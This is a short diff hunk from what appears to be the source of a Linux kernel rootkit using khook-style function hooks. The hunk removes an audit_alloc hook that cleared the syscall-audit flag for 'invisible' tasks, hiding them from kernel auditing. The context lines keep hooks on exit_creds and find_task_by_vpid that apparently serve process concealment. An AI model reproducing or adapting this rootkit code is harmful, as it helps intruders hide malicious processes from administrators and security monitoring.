@@ -38,19 +38,6 @@ static void khook_exit_creds(struct task_struct *p)
 		p->flags &= ~FLAG;
 }
 
-KHOOK(audit_alloc);
-static int khook_audit_alloc(struct task_struct *t)
-{
-	int err = 0;
-
-	if (is_task_invisible(t)) {
-		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
-	} else {
-		err = KHOOK_ORIGIN(audit_alloc, t);
-	}
-	return err;
-}
-
 KHOOK(find_task_by_vpid);
 struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 {
